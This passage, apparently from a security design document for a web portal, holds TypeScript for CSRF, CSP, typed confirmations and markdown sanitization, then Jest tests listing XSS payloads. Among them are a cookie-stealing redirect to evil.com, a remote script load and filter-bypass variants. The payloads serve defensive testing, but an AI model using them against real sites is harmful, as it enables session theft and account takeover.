      // Skip CSRF check for excluded paths
      if (this.config.excludePaths.some(excludePath => path.startsWith(excludePath))) {
        return next();
      }

      // Require session
      if (!req.session?.id) {
        return this.sendCSRFError(req, res, 'No valid session');
      }

      const sessionId = req.session.id;

      // Extract CSRF token from multiple possible locations
      const token = this.extractToken(req);
      const signature = this.extractSignature(req);

      if (!token || !signature) {
        return this.sendCSRFError(req, res, 'Missing CSRF token or signature');
      }

      // Validate token
      const isValid = this.validateToken(token, signature, sessionId);
      
      if (!isValid) {
        return this.sendCSRFError(req, res, 'Invalid CSRF token');
      }

      // Add token info to request for use by route handlers
      req.csrfToken = token;
      req.isCSRFValid = true;

      // Log successful validation
      console.log(`CSRF validation successful for session ${sessionId}, path ${path}`);

      next();
    };
  }

  /**
   * Extract CSRF token from request
   */
  private extractToken(req: Request): string | null {
    // Priority order: header, body, query
    return req.headers[this.config.headerName.toLowerCase()] as string ||
           req.body?._csrf ||
           req.query._csrf ||
           null;
  }

  /**
   * Extract CSRF signature from request
   */
  private extractSignature(req: Request): string | null {
    // Extract from cookie
    return req.cookies?.[this.config.cookieName] || null;
  }

  /**
   * Send appropriate CSRF error response
   */
  private sendCSRFError(req: Request, res: Response, message: string): void {
    // Log security violation
    console.warn(`CSRF violation: ${message} for ${req.method} ${req.path} from ${req.ip}`);

    // Check if request is from HTMX (AJAX)
    const isHTMX = req.headers['hx-request'] === 'true' || 
                   req.headers['x-requested-with'] === 'XMLHttpRequest';

    if (isHTMX) {
      // Return JSON for AJAX requests
      res.status(403).json({
        error: 'CSRF_TOKEN_INVALID',
        message: 'Security token validation failed. Please refresh the page.',
        code: 'SECURITY_VIOLATION'
      });
    } else {
      // Render error page for browser requests
      res.status(403).render('errors/security-error', {
        title: 'Security Error',
        message: 'Your request could not be processed due to a security check failure. Please refresh the page and try again.',
        errorCode: 'CSRF_INVALID'
      });
    }
  }

  /**
   * Generate token pair for embedding in forms
   */
  public generateTokenPair(sessionId: string): { token: string; cookieValue: string } {
    const { token, signature } = this.generateTokenForSession(sessionId);
    return {
      token,
      cookieValue: signature
    };
  }

  /**
   * Cleanup on shutdown
   */
  public destroy(): void {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
    this.tokenStore.clear();
  }
}

// Factory function for creating configured CSRF protection
export function createCSRFProtection(config: Partial<CSRFConfig> = {}): CSRFProtection {
  const defaultConfig: CSRFConfig = {
    tokenTTL: 24 * 60 * 60 * 1000, // 24 hours
    cookieName: '__csrf_signature',
    headerName: 'X-CSRF-Token',
    excludePaths: ['/api/public', '/health', '/metrics'],
    secretKey: process.env.CSRF_SECRET_KEY || 'change-me-in-production'
  };

  const mergedConfig = { ...defaultConfig, ...config };
  
  if (mergedConfig.secretKey === 'change-me-in-production' && process.env.NODE_ENV === 'production') {
    throw new Error('CSRF_SECRET_KEY must be set in production environment');
  }

  return new CSRFProtection(mergedConfig);
}

// Helper function for route handlers to set CSRF cookie
export function setCSRFCookie(res: Response, cookieValue: string, config: Partial<CSRFConfig> = {}): void {
  const cookieName = config.cookieName || '__csrf_signature';
  
  res.cookie(cookieName, cookieValue, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: config.tokenTTL || 24 * 60 * 60 * 1000,
    path: '/'
  });
}
```

### Typed CONFIRM Modal System

```typescript
// /Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/confirmation-tokens.ts

import { randomBytes } from 'crypto';

interface ConfirmationConfig {
  tokenTTL: number; // 60 seconds
  maxTokensPerSession: number; // 3
  rateLimitWindow: number; // 60 seconds  
}

interface ConfirmationToken {
  token: string;
  createdAt: number;
  sessionId: string;
  action: string;
  confirmationPhrase: string;
  metadata?: Record<string, any>;
}

interface ConfirmationRequest {
  action: string;
  confirmationPhrase: string;
  metadata?: Record<string, any>;
}

export class TypedConfirmationService {
  private tokenStore = new Map<string, ConfirmationToken>();
  private rateLimitStore = new Map<string, number[]>();
  private cleanupInterval: NodeJS.Timeout;

  constructor(private config: ConfirmationConfig) {
    // Cleanup expired tokens and rate limit data every 30 seconds
    this.cleanupInterval = setInterval(() => {
      this.cleanup();
    }, 30 * 1000);
  }

  /**
   * Generate confirmation token for destructive action
   */
  public generateConfirmationToken(
    sessionId: string, 
    request: ConfirmationRequest
  ): { token: string; success: boolean; error?: string } {
    
    // Check rate limiting
    if (!this.checkRateLimit(sessionId)) {
      return {
        token: '',
        success: false,
        error: 'Too many confirmation requests. Please wait before trying again.'
      };
    }

    // Generate cryptographically secure token
    const token = randomBytes(16).toString('hex');
    
    // Store token
    this.tokenStore.set(token, {
      token,
      createdAt: Date.now(),
      sessionId,
      action: request.action,
      confirmationPhrase: request.confirmationPhrase,
      metadata: request.metadata
    });

    // Update rate limit tracking
    this.updateRateLimit(sessionId);

    console.log(`Generated confirmation token for session ${sessionId}, action: ${request.action}`);

    return { token, success: true };
  }

  /**
   * Validate confirmation attempt
   */
  public validateConfirmation(
    token: string,
    sessionId: string,
    userInput: string
  ): { valid: boolean; error?: string; action?: string; metadata?: Record<string, any> } {
    
    const storedToken = this.tokenStore.get(token);
    
    if (!storedToken) {
      return { valid: false, error: 'Invalid or expired confirmation token' };
    }

    // Verify session ownership
    if (storedToken.sessionId !== sessionId) {
      return { valid: false, error: 'Token does not belong to current session' };
    }

    // Check expiration (60 seconds)
    if (Date.now() - storedToken.createdAt > this.config.tokenTTL) {
      this.tokenStore.delete(token);
      return { valid: false, error: 'Confirmation token has expired' };
    }

    // Validate user input (case-sensitive exact match)
    if (userInput !== storedToken.confirmationPhrase) {
      return { valid: false, error: 'Confirmation phrase does not match' };
    }

    // Token is valid - remove it (one-time use)
    this.tokenStore.delete(token);

    console.log(`Confirmation validated for session ${sessionId}, action: ${storedToken.action}`);

    return {
      valid: true,
      action: storedToken.action,
      metadata: storedToken.metadata
    };
  }

  /**
   * Check rate limiting for session
   */
  private checkRateLimit(sessionId: string): boolean {
    const now = Date.now();
    const attempts = this.rateLimitStore.get(sessionId) || [];
    
    // Remove attempts outside the window
    const validAttempts = attempts.filter(
      timestamp => now - timestamp < this.config.rateLimitWindow
    );

    return validAttempts.length < this.config.maxTokensPerSession;
  }

  /**
   * Update rate limit tracking
   */
  private updateRateLimit(sessionId: string): void {
    const now = Date.now();
    const attempts = this.rateLimitStore.get(sessionId) || [];
    attempts.push(now);
    
    // Keep only recent attempts
    const validAttempts = attempts.filter(
      timestamp => now - timestamp < this.config.rateLimitWindow
    );
    
    this.rateLimitStore.set(sessionId, validAttempts);
  }

  /**
   * Cleanup expired tokens and rate limit data
   */
  private cleanup(): void {
    const now = Date.now();
    
    // Cleanup expired tokens
    for (const [token, data] of this.tokenStore.entries()) {
      if (now - data.createdAt > this.config.tokenTTL) {
        this.tokenStore.delete(token);
      }
    }

    // Cleanup old rate limit data
    for (const [sessionId, attempts] of this.rateLimitStore.entries()) {
      const validAttempts = attempts.filter(
        timestamp => now - timestamp < this.config.rateLimitWindow
      );
      
      if (validAttempts.length === 0) {
        this.rateLimitStore.delete(sessionId);
      } else {
        this.rateLimitStore.set(sessionId, validAttempts);
      }
    }
  }

  /**
   * Get confirmation phrases for different actions
   */
  public getConfirmationPhrase(action: string): string {
    const phrases: Record<string, string> = {
      'kill-switch': 'EMERGENCY STOP',
      'circuit-breaker-reset': 'RESET BREAKER', 
      'allowlist-remove': 'REMOVE ACCESS',
      'trust-level-reduce': 'REDUCE TRUST',
      'delete-pipeline': 'DELETE FOREVER',
      'reset-config': 'RESET CONFIG'
    };

    return phrases[action] || 'CONFIRM ACTION';
  }

  /**
   * Generate full confirmation request for action
   */
  public createConfirmationRequest(
    action: string,
    metadata?: Record<string, any>
  ): ConfirmationRequest {
    return {
      action,
      confirmationPhrase: this.getConfirmationPhrase(action),
      metadata
    };
  }

  /**
   * Cleanup on shutdown
   */
  public destroy(): void {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
    this.tokenStore.clear();
    this.rateLimitStore.clear();
  }
}

// Factory function
export function createTypedConfirmationService(config: Partial<ConfirmationConfig> = {}): TypedConfirmationService {
  const defaultConfig: ConfirmationConfig = {
    tokenTTL: 60 * 1000, // 60 seconds
    maxTokensPerSession: 3,
    rateLimitWindow: 60 * 1000 // 60 seconds
  };

  return new TypedConfirmationService({ ...defaultConfig, ...config });
}
```

### Content Security Policy Implementation

```typescript
// /Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/csp-middleware.ts

import { Request, Response, NextFunction } from 'express';
import { randomBytes } from 'crypto';

interface CSPConfig {
  environment: 'development' | 'production';
  reportOnly: boolean;
  reportUri?: string;
  nonce: boolean;
  allowUnsafeInline: boolean;
  customPolicies?: Record<string, string>;
}

interface CSPDirectives {
  'default-src': string[];
  'script-src': string[];
  'style-src': string[];
  'img-src': string[];
  'font-src': string[];
  'object-src': string[];
  'frame-ancestors': string[];
  'base-uri': string[];
  'form-action': string[];
  'connect-src'?: string[];
  'media-src'?: string[];
  'worker-src'?: string[];
}

interface CSPRequestExtension {
  nonce?: string;
}

declare global {
  namespace Express {
    interface Request extends CSPRequestExtension {}
  }
}

export class CSPMiddleware {
  private config: CSPConfig;

  constructor(config: CSPConfig) {
    this.config = config;
  }

  /**
   * Generate cryptographic nonce for inline scripts
   */
  private generateNonce(): string {
    return randomBytes(16).toString('base64');
  }

  /**
   * Build CSP directives based on configuration
   */
  private buildDirectives(nonce?: string): CSPDirectives {
    const baseDirectives: CSPDirectives = {
      'default-src': ["'self'"],
      'script-src': ["'self'"],
      'style-src': ["'self'"],
      'img-src': ["'self'", 'data:'],
      'font-src': ["'self'"],
      'object-src': ["'none'"],
      'frame-ancestors': ["'none'"],
      'base-uri': ["'self'"],
      'form-action': ["'self'"]
    };

    // Add nonce for scripts if enabled
    if (this.config.nonce && nonce) {
      baseDirectives['script-src'].push(`'nonce-${nonce}'`);
    }

    // Allow unsafe-inline for styles (required for some CSS frameworks)
    if (this.config.allowUnsafeInline) {
      baseDirectives['style-src'].push("'unsafe-inline'");
    }

    // Development-specific relaxations
    if (this.config.environment === 'development') {
      // Allow localhost and development servers
      baseDirectives['connect-src'] = ["'self'", 'localhost:*', '127.0.0.1:*', 'ws:', 'wss:'];
      
      // Allow eval for development tools (with warning)
      if (this.config.allowUnsafeInline) {
        baseDirectives['script-src'].push("'unsafe-eval'");
        console.warn('CSP: unsafe-eval enabled for development - this should NOT be used in production');
      }
    } else {
      // Production hardening
      baseDirectives['connect-src'] = ["'self'"];
    }

    return baseDirectives;
  }

  /**
   * Convert directives object to CSP header string
   */
  private directivesToString(directives: CSPDirectives): string {
    return Object.entries(directives)
      .filter(([key, value]) => value && value.length > 0)
      .map(([key, value]) => `${key} ${value.join(' ')}`)
      .join('; ');
  }

  /**
   * CSP middleware function
   */
  public middleware() {
    return (req: Request, res: Response, next: NextFunction): void => {
      // Generate nonce if enabled
      let nonce: string | undefined;
      if (this.config.nonce) {
        nonce = this.generateNonce();
        req.nonce = nonce;
      }

      // Build CSP directives
      const directives = this.buildDirectives(nonce);
      
      // Apply custom policies if provided
      if (this.config.customPolicies) {
        for (const [directive, value] of Object.entries(this.config.customPolicies)) {
          if (directive in directives) {
            (directives as any)[directive] = value.split(' ');
          }
        }
      }

      // Convert to header string
      const cspHeader = this.directivesToString(directives);

      // Set appropriate CSP header
      const headerName = this.config.reportOnly ? 
        'Content-Security-Policy-Report-Only' : 
        'Content-Security-Policy';

      // Add report-uri if configured
      let finalHeader = cspHeader;
      if (this.config.reportUri) {
        finalHeader += `; report-uri ${this.config.reportUri}`;
      }

      res.setHeader(headerName, finalHeader);

      // Log CSP header in development
      if (this.config.environment === 'development') {
        console.log(`CSP Header (${headerName}): ${finalHeader}`);
      }

      next();
    };
  }

  /**
   * Handle CSP violation reports
   */
  public violationHandler() {
    return (req: Request, res: Response): void => {
      try {
        const report = req.body;
        
        // Log violation details
        console.warn('CSP Violation Report:', {
          timestamp: new Date().toISOString(),
          userAgent: req.headers['user-agent'],
          ip: req.ip,
          report: report
        });

        // In production, you might want to send to monitoring service
        if (this.config.environment === 'production') {
          this.sendToMonitoringService(report, req);
        }

        res.status(204).end(); // No content response
      } catch (error) {
        console.error('Error processing CSP violation report:', error);
        res.status(400).json({ error: 'Invalid report format' });
      }
    };
  }

  /**
   * Send violation report to monitoring service
   */
  private async sendToMonitoringService(report: any, req: Request): Promise<void> {
    try {
      // Implementation would depend on your monitoring setup
      // Examples: DataDog, New Relic, custom logging service
      
      const violationEvent = {
        type: 'csp_violation',
        timestamp: Date.now(),
        source: 'autonomous-dev-portal',
        details: {
          blockedUri: report['blocked-uri'],
          documentUri: report['document-uri'],
          violatedDirective: report['violated-directive'],
          originalPolicy: report['original-policy'],
          userAgent: req.headers['user-agent'],
          clientIp: req.ip
        }
      };

      // Example: Send to webhook or logging service
      // await fetch(process.env.MONITORING_WEBHOOK_URL, {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify(violationEvent)
      // });

    } catch (error) {
      console.error('Failed to send CSP violation to monitoring service:', error);
    }
  }
}

// Factory function for different environments
export function createCSPMiddleware(environment: 'development' | 'production' = 'production'): CSPMiddleware {
  const config: CSPConfig = {
    environment,
    reportOnly: environment === 'development', // Report-only in dev, enforcing in prod
    reportUri: '/api/security/csp-violation-report',
    nonce: true,
    allowUnsafeInline: environment === 'development', // Only allow in development
  };

  return new CSPMiddleware(config);
}

// Helper function to get nonce from request (for templates)
export function getNonce(req: Request): string {
  return req.nonce || '';
}

// CSP directive builder for specific use cases
export function buildCustomCSP(overrides: Partial<CSPDirectives> = {}): string {
  const baseDirectives: CSPDirectives = {
    'default-src': ["'self'"],
    'script-src': ["'self'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", 'data:'],
    'font-src': ["'self'"],
    'object-src': ["'none'"],
    'frame-ancestors': ["'none'"],
    'base-uri': ["'self'"],
    'form-action': ["'self'"]
  };

  const mergedDirectives = { ...baseDirectives, ...overrides };

  return Object.entries(mergedDirectives)
    .filter(([key, value]) => value && value.length > 0)
    .map(([key, value]) => `${key} ${value.join(' ')}`)
    .join('; ');
}
```

### Sanitization Pipeline

```typescript
// /Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/sanitization-pipeline.ts

import { marked } from 'marked';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// Configure DOMPurify with JSDOM for server-side use
const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

interface SanitizationConfig {
  allowedTags: string[];
  allowedAttributes: Record<string, string[]>;
  allowCodeBlocks: boolean;
  maxContentLength: number;
  enableCaching: boolean;
}

interface SanitizationResult {
  sanitized: string;
  warnings: string[];
  blocked: string[];
  safe: boolean;
}

export class MarkdownSanitizationPipeline {
  private config: SanitizationConfig;
  private cache = new Map<string, SanitizationResult>();
  private markedRenderer: marked.Renderer;

  constructor(config: Partial<SanitizationConfig> = {}) {
    this.config = {
      allowedTags: [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'p', 'br', 'strong', 'em', 'code', 'pre',
        'ul', 'ol', 'li', 'blockquote',
        'a', 'img', 'table', 'thead', 'tbody', 'tr', 'td', 'th'
      ],
      allowedAttributes: {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'title', 'width', 'height'],
        'code': ['class'],
        'pre': ['class'],
        '*': ['id', 'class'] // Global attributes
      },
      allowCodeBlocks: true,
      maxContentLength: 100000, // 100KB
      enableCaching: true,
      ...config
    };

    this.setupMarkedRenderer();
    this.configureDOMPurify();
  }

  /**
   * Configure marked with security-focused renderer
   */
  private setupMarkedRenderer(): void {
    this.markedRenderer = new marked.Renderer();

    // Override link renderer to ensure safe URLs
    this.markedRenderer.link = (href: string, title: string | null, text: string): string => {
      // Block javascript: URLs and data: URLs for links
      if (href.startsWith('javascript:') || href.startsWith('data:') || href.startsWith('vbscript:')) {
        return `<span class="blocked-link" title="Blocked unsafe URL">${text}</span>`;
      }

      // Ensure external links open in new tab and have security attributes
      const isExternal = href.startsWith('http://') || href.startsWith('https://');
      const target = isExternal ? ' target="_blank" rel="noopener noreferrer"' : '';
      const titleAttr = title ? ` title="${this.escapeHtml(title)}"` : '';

      return `<a href="${this.escapeHtml(href)}"${titleAttr}${target}>${text}</a>`;
    };

    // Override image renderer for security
    this.markedRenderer.image = (src: string, title: string | null, text: string): string => {
      // Block javascript: URLs and limit data: URLs
      if (src.startsWith('javascript:') || src.startsWith('vbscript:')) {
        return `<span class="blocked-image" title="Blocked unsafe image source">[Image blocked: unsafe URL]</span>`;
      }

      // Allow data: URLs only for small images (base64)
      if (src.startsWith('data:')) {
        if (src.length > 10000) { // Limit data URL size
          return `<span class="blocked-image" title="Blocked large data URL">[Image blocked: too large]</span>`;
        }
      }

      const titleAttr = title ? ` title="${this.escapeHtml(title)}"` : '';
      const altAttr = text ? ` alt="${this.escapeHtml(text)}"` : ' alt=""';

      return `<img src="${this.escapeHtml(src)}"${altAttr}${titleAttr} loading="lazy">`;
    };

    // Override code renderer to prevent XSS
    this.markedRenderer.code = (code: string, language?: string): string => {
      const escapedCode = this.escapeHtml(code);
      const langClass = language ? ` language-${this.escapeHtml(language)}` : '';
      
      return `<pre class="code-block${langClass}"><code>${escapedCode}</code></pre>`;
    };

    // Override codespan (inline code)
    this.markedRenderer.codespan = (code: string): string => {
      return `<code class="inline-code">${this.escapeHtml(code)}</code>`;
    };

    // Configure marked options
    marked.setOptions({
      renderer: this.markedRenderer,
      headerIds: false, // Disable header IDs to prevent anchor attacks
      mangle: false, // Don't mangle email addresses
      sanitize: false, // We handle sanitization with DOMPurify
      breaks: true, // Convert \n to <br>
      gfm: true, // GitHub Flavored Markdown
      tables: true,
      pedantic: false,
      silent: false // We want to catch errors
    });
  }

  /**
   * Configure DOMPurify for strict sanitization
   */
  private configureDOMPurify(): void {
    // Configure allowed tags and attributes
    purify.setConfig({
      ALLOWED_TAGS: this.config.allowedTags,
      ALLOWED_ATTR: this.getAllowedAttributes(),
      ALLOW_DATA_ATTR: false, // Block all data-* attributes
      ALLOW_UNKNOWN_PROTOCOLS: false, // Block unknown URL protocols
      RETURN_DOM_FRAGMENT: false,
      RETURN_DOM_IMPORT: false,
      SANITIZE_DOM: true,
      FORBID_TAGS: ['script', 'style', 'object', 'embed', 'form', 'input', 'button', 'textarea', 'select'],
      FORBID_ATTR: ['on*', 'style', 'srcdoc'], // Block event handlers and inline styles
      KEEP_CONTENT: true, // Keep content of forbidden tags (just remove the tags)
      FORCE_BODY: false,
      WHOLE_DOCUMENT: false
    });

    // Add hooks for additional security
    purify.addHook('beforeSanitizeElements', (node) => {
      // Log attempts to use forbidden elements
      if (node.nodeName && ['SCRIPT', 'OBJECT', 'EMBED', 'FORM'].includes(node.nodeName)) {
        console.warn(`Blocked forbidden element: ${node.nodeName}`);
      }
    });

    purify.addHook('beforeSanitizeAttributes', (node) => {
      // Block any attribute starting with 'on' (event handlers)
      if (node.attributes) {
        for (let i = node.attributes.length - 1; i >= 0; i--) {
          const attr = node.attributes[i];
          if (attr.name.toLowerCase().startsWith('on')) {
            console.warn(`Blocked event handler attribute: ${attr.name}`);
            node.removeAttribute(attr.name);
          }
        }
      }
    });
  }

  /**
   * Get flattened allowed attributes for DOMPurify
   */
  private getAllowedAttributes(): string[] {
    const attrs = new Set<string>();
    Object.values(this.config.allowedAttributes).forEach(attrList => {
      attrList.forEach(attr => attrs.add(attr));
    });
    return Array.from(attrs);
  }

  /**
   * HTML escape utility
   */
  private escapeHtml(unsafe: string): string {
    return unsafe
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  /**
   * Main sanitization pipeline
   */
  public async sanitizeMarkdown(markdown: string): Promise<SanitizationResult> {
    const warnings: string[] = [];
    const blocked: string[] = [];

    try {
      // Check content length
      if (markdown.length > this.config.maxContentLength) {
        return {
          sanitized: '',
          warnings: [`Content exceeds maximum length of ${this.config.maxContentLength} characters`],
          blocked: ['entire-content'],
          safe: false
        };
      }

      // Check cache if enabled
      if (this.config.enableCaching) {
        const cached = this.cache.get(markdown);
        if (cached) {
          return cached;
        }
      }

      // Step 1: Parse markdown to HTML
      let html: string;
      try {
        html = await marked.parse(markdown);
      } catch (error) {
        warnings.push(`Markdown parsing error: ${error instanceof Error ? error.message : 'Unknown error'}`);
        // Fallback to escaped plain text
        html = `<pre>${this.escapeHtml(markdown)}</pre>`;
      }

      // Step 2: Sanitize with DOMPurify
      const sanitized = purify.sanitize(html, {
        RETURN_DOM_FRAGMENT: false,
        RETURN_DOM_IMPORT: false
      });

      // Step 3: Detect what was removed/blocked
      const originalElements = this.extractElements(html);
      const sanitizedElements = this.extractElements(sanitized);
      
      for (const element of originalElements) {
        if (!sanitizedElements.includes(element)) {
          blocked.push(element);
        }
      }

      // Step 4: Additional security checks
      if (sanitized.includes('<script') || sanitized.includes('javascript:') || sanitized.includes('vbscript:')) {
        return {
          sanitized: '',
          warnings: ['Content contains potentially dangerous scripts after sanitization'],
          blocked: ['script-content'],
          safe: false
        };
      }

      const result: SanitizationResult = {
        sanitized,
        warnings,
        blocked,
        safe: blocked.length === 0 && warnings.length === 0
      };

      // Cache result if enabled
      if (this.config.enableCaching && this.cache.size < 1000) { // Limit cache size
        this.cache.set(markdown, result);
      }

      return result;

    } catch (error) {
      return {
        sanitized: '',
        warnings: [`Sanitization failed: ${error instanceof Error ? error.message : 'Unknown error'}`],
        blocked: ['all-content'],
        safe: false
      };
    }
  }

  /**
   * Extract element names from HTML for comparison
   */
  private extractElements(html: string): string[] {
    const elements: string[] = [];
    const regex = /<(\w+)/g;
    let match;
    while ((match = regex.exec(html)) !== null) {
      elements.push(match[1].toLowerCase());
    }
    return elements;
  }

  /**
   * Sanitize code diffs with entity encoding only
   */
  public sanitizeCodeDiff(diff: string): string {
    // For code diffs, use only HTML entity encoding
    // No markdown processing, no HTML tags allowed
    return this.escapeHtml(diff);
  }

  /**
   * Clear cache
   */
  public clearCache(): void {
    this.cache.clear();
  }

  /**
   * Get cache statistics
   */
  public getCacheStats(): { size: number; maxSize: number } {
    return {
      size: this.cache.size,
      maxSize: 1000
    };
  }
}

// Factory function
export function createSanitizationPipeline(config: Partial<SanitizationConfig> = {}): MarkdownSanitizationPipeline {
  return new MarkdownSanitizationPipeline(config);
}

// Helper function to validate that content is safe for display
export function validateSafeContent(result: SanitizationResult): boolean {
  return result.safe && result.blocked.length === 0;
}

// Refusal pattern when sanitization fails
export function getRefusalMessage(result: SanitizationResult): string {
  if (result.warnings.length > 0) {
    return `Content cannot be displayed due to security concerns: ${result.warnings.join(', ')}`;
  }
  
  if (result.blocked.length > 0) {
    return `Content contains blocked elements: ${result.blocked.join(', ')}`;
  }

  return 'Content failed security validation and cannot be displayed.';
}
```

## Security Testing Framework

### XSS Attack Vector Tests

```typescript
// /Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/xss-payload-tests.spec.ts

import { describe, test, expect, beforeEach } from '@jest/globals';
import { createSanitizationPipeline, validateSafeContent, getRefusalMessage } from '../../src/portal/security/sanitization-pipeline';

describe('XSS Attack Vector Tests', () => {
  let sanitizer: any;

  beforeEach(() => {
    sanitizer = createSanitizationPipeline({
      enableCaching: false // Disable caching for tests
    });
  });

  describe('Script Tag Attacks', () => {
    const scriptAttacks = [
      '<script>alert("XSS")</script>',
      '<script src="http://evil.com/evil.js"></script>',
      '<script>document.location="http://evil.com/?cookie="+document.cookie</script>',
      '<script\x20type="text/javascript">alert("XSS")</script>',
      '<script\x09language="javascript">alert("XSS")</script>',
      '<script\x0Dtype="text/javascript">alert("XSS")</script>',
      '<ScRiPt>alert("XSS")</ScRiPt>', // Case variation
      '<<SCRIPT>alert("XSS");//<</SCRIPT>', // Tag breaking
      '<script>/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//'
    ];

    test.each(scriptAttacks)('should block script attack: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('alert(');
      expect(result.blocked).toContain('script');
      expect(validateSafeContent(result)).toBe(false);
    });
  });

  describe('Event Handler Attacks', () => {
    const eventAttacks = [
      '<img src="x" onerror="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<div onmouseover="alert(\'XSS\')">Hover me</div>',
      '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<style>@import "javascript:alert(\'XSS\')";</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>'
    ];

    test.each(eventAttacks)('should block event handler: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Check that no event handlers remain
      expect(result.sanitized).not.toMatch(/\bon\w+\s*=/i);
      expect(result.sanitized).not.toContain('javascript:');
      expect(validateSafeContent(result)).toBe(false);
    });
  });

  describe('JavaScript URL Attacks', () => {
    const jsUrlAttacks = [
      '[XSS](javascript:alert("XSS"))',
      '[Click me](javascript:void(0);alert("XSS"))',
      '<a href="javascript:alert(\'XSS\')">Click</a>',
      '<area shape="rect" coords="0,0,100,100" href="javascript:alert(\'XSS\')">',
      '![XSS](javascript:alert("XSS"))',
      '<img src="javascript:alert(\'XSS\')">',
      '[XSS](vbscript:msgbox("XSS"))',
      '[XSS](data:text/html,<script>alert("XSS")</script>)'
    ];

    test.each(jsUrlAttacks)('should block JavaScript URLs: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      expect(result.sanitized).not.toContain('javascript:');
      expect(result.sanitized).not.toContain('vbscript:');
      expect(result.sanitized).not.toMatch(/href\s*=\s*["']?javascript:/i);
      expect(result.sanitized).not.toMatch(/src\s*=\s*["']?javascript:/i);
    });
  });

  describe('SVG-based XSS Attacks', () => {
    const svgAttacks = [
      '<svg onload="alert(\'XSS\')"></svg>',
      '<svg><script>alert("XSS")</script></svg>',
      '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
      '<svg><use href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'></svg>"/>',
      '<svg><animate onbegin="alert(\'XSS\')" attributeName="x" dur="1s">',
      '<svg><set onbegin="alert(\'XSS\')" attributeName="x" to="0">',
      '```\n<svg onload="alert(\'XSS\')"></svg>\n```', // In code block
      '![SVG](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI+)'
    ];

    test.each(svgAttacks)('should block SVG-based XSS: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // SVG elements should either be removed or have dangerous attributes stripped
      if (result.sanitized.includes('<svg')) {
        expect(result.sanitized).not.toMatch(/\son\w+\s*=/i);
        expect(result.sanitized).not.toContain('<script');
        expect(result.sanitized).not.toContain('javascript:');
      }
    });
  });

  describe('CSS-based Attacks', () => {
    const cssAttacks = [
      '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      '<div style="background: url(javascript:alert(\'XSS\'))">',
      '<div style="expression(alert(\'XSS\'))">',
      '<style>@import "javascript:alert(\'XSS\')";</style>',
      '<style>li {list-style-image: url("javascript:alert(\'XSS\')")}</style>',
      '<style>body {binding:url(xss.xml#xss)}</style>',
      '<style>div {behavior: url(xss.htc);}</style>',
      '<link rel="stylesheet" type="text/css" href="javascript:alert(\'XSS\');">',
      '<style>/**/background:url(javascript:alert(\'XSS\'))</style>'
    ];

    test.each(cssAttacks)('should block CSS-based XSS: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Style elements and style attributes should be removed
      expect(result.sanitized).not.toContain('<style');
      expect(result.sanitized).not.toMatch(/style\s*=/i);
      expect(result.sanitized).not.toContain('javascript:');
      expect(result.sanitized).not.toContain('expression(');
    });
  });

  describe('HTML Entity Encoding Bypass Attempts', () => {
    const entityAttacks = [
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '&#x3c;script&#x3e;alert("XSS")&#x3c;/script&#x3e;',
      '&amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;',
      '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62)
    ];

    test.each(entityAttacks)('should properly handle encoded content: %s', async (payload) => {
      const result = await sanitizer.sanitizeMarkdown(payload);
      
      // Ensure double-encoding doesn't occur and content is safe
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('alert(');
    });
  });

  describe('Data URI Attacks', () => {
    const dataUriAttacks = [
      'data:text/html,<script>alert("XSS")</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
      'data:image/svg+xml,<svg onload="alert(\'XSS\')"></svg>',
      'data:application/javascript,alert("XSS")',
